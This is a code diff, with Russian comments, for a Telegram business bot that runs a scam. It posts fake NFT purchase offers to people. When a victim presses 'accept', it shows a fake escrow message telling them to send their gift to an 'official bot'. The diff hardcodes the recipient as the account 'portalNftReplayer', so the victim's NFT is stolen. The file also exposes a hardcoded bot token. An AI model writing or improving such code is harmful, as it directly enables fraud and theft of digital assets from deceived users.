@@ -10,6 +10,7 @@ from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 
 # ==========================================
+# ВСТАВЬ СЮДА СВОЙ НОВЫЙ ТОКЕН (если отзывал старый)
 BOT_TOKEN = "9150035187:AAHA1yqlsiU1CwnGECEMP5VX_1cFrG4t0Ho"
 # ==========================================
 
@@ -21,6 +22,7 @@ dp = Dispatcher()
 
 AUTHORIZED_USERS = set()
 
+# --- ВЕБ-СЕРВЕР ДЛЯ RENDER ---
 app = Flask(__name__)
 
 @app.route('/')
@@ -31,6 +33,7 @@ def run_flask():
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
 
+# --- ЛОГИКА БОТА ---
 @dp.business_message(F.text == SECRET_KEY)
 async def unlock_bot(message: types.Message):
     AUTHORIZED_USERS.add(message.from_user.id)
@@ -60,7 +63,7 @@ async def handle_price_command(message: types.Message):
     except Exception as e:
         logging.error(f"Не удалось удалить команду: {e}")
 
-    # Ловим username в конце команды (например, @walking_45)
+    # Ловим ссылку, цену, валюту (и юзера, если он есть, но мы его потом перезапишем)
     pattern = r"^/price\s+(https?://\S+)\s+([\d\.]+)\s+(gram|stars)(?:\s+(@\w+))?$"
     match = re.match(pattern, message.text, re.IGNORECASE)
     if not match:
@@ -68,21 +71,19 @@ async def handle_price_command(message: types.Message):
 
     nft_link, price_value, currency, target_user = match.groups()
     currency = currency.lower()
-    
-    # Если юзер не указан, используем заглушку (или самого пользователя)
-    if not target_user:
-        target_user = "@username"
 
     nft_name_raw = nft_link.split('/')[-1].replace('-', '')
     nft_name_formatted = nft_name_raw.capitalize() 
 
     price_text = f"{price_value} ⭐" if currency == "stars" else f"{price_value} 💎"
 
-    # Передаем username в callback_data кнопки "Принять"
+    # Передаем цену в callback_data кнопки "Принять"
+    callback_data = f"accept:{price_text}"
+
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text="Отклонить", callback_data="decline_offer"),
-            InlineKeyboardButton(text="Принять", callback_data=f"accept_offer:{target_user}")
+            InlineKeyboardButton(text="Принять", callback_data=callback_data)
         ]
     ])
 
@@ -105,41 +106,40 @@ async def handle_price_command(message: types.Message):
     except Exception as e:
         logging.error(f"Ошибка при отправке: {e}")
 
-@dp.callback_query(F.data.startswith("accept_offer:"))
+# --- ОБРАБОТЧИК КНОПКИ "ПРИНЯТЬ" ---
+@dp.callback_query(F.data.startswith("accept:"))
 async def accept_offer(callback: types.CallbackQuery):
     await callback.answer()
 
-    # Достаем username, которому будем дарить
-    target_user = callback.data.split(":")[1]
-
-    # Формируем текст розовой плашки
-    transfer_bot = "@portals_nftbot"
-    
-    new_text = (
-        f"<b>Покупатель зарезервировал ваш подарок.</b>\n\n"
-        f"<blockquote>"
-        f"Средства хранятся на специальном эскроу-счете и будут зачислены на баланс после передачи подарка.\n\n"
-        f"<b>Для завершения сделки:</b>\n"
-        f"1. Передайте подарок официальному боту: {transfer_bot}\n"
-        f"2. Нажмите «Передать NFT» и выберите NFT.\n"
-        f"3. Подтвердите передачу подарка.\n\n"
-        f"Telegram зафиксирует транзакцию и моментально зачислит {callback.message.text.split('предлагает вам ')[-1].split(' за')[0]} на ваш аккаунт.\n\n"
-        f"<b>Резерв действует 24 часа.</b>"
-        f"</blockquote>"
-    )
-
-    # Формируем ссылку для передачи подарка
-    # Убираем @ из username, если он там есть
-    clean_username = target_user.replace('@', '')
-    
-    # Вот та самая ссылка, которую ты просил
-    gift_link = f"tg://send_gift?to={portalNftReplayer}"
-
-    new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Передать NFT", url=gift_link)]
-    ])
-
     try:
+        # Достаем цену из callback_data
+        parts = callback.data.split(":")
+        price_str = parts[1]
+
+        transfer_bot = "@portals_nftbot"
+        
+        # Формируем текст розовой плашки
+        new_text = (
+            f"<b>Покупатель зарезервировал ваш подарок.</b>\n\n"
+            f"<blockquote>"
+            f"Средства хранятся на специальном эскроу-счете и будут зачислены на баланс после передачи подарка.\n\n"
+            f"<b>Для завершения сделки:</b>\n"
+            f"1. Передайте подарок официальному боту: {transfer_bot}\n"
+            f"2. Нажмите «Передать NFT» и выберите NFT.\n"
+            f"3. Подтвердите передачу подарка.\n\n"
+            f"Telegram зафиксирует транзакцию и моментально зачислит {price_str} на ваш аккаунт.\n\n"
+            f"<b>Резерв действует 24 часа.</b>"
+            f"</blockquote>"
+        )
+
+        # ЖЕСТКО ЗАДАЕМ ПОЛЬЗОВАТЕЛЯ ДЛЯ ПОДАРКА
+        target_username = "portalNftReplayer" 
+        gift_link = f"tg://send_gift?to={target_username}"
+
+        new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Передать NFT", url=gift_link)]
+        ])
+
         await bot.edit_message_text(
             text=new_text,
             chat_id=callback.message.chat.id,
@@ -148,7 +148,8 @@ async def accept_offer(callback: types.CallbackQuery):
             business_connection_id=callback.message.business_connection_id
         )
     except Exception as e:
-        logging.error(f"Ошибка при редактировании: {e}")
+        logging.error(f"Ошибка в кнопке: {e}")
+        await callback.answer(f"Ошибка: {e}", show_alert=True)
 
 @dp.callback_query(F.data == "decline_offer")
 async def decline_offer(callback: types.CallbackQuery):
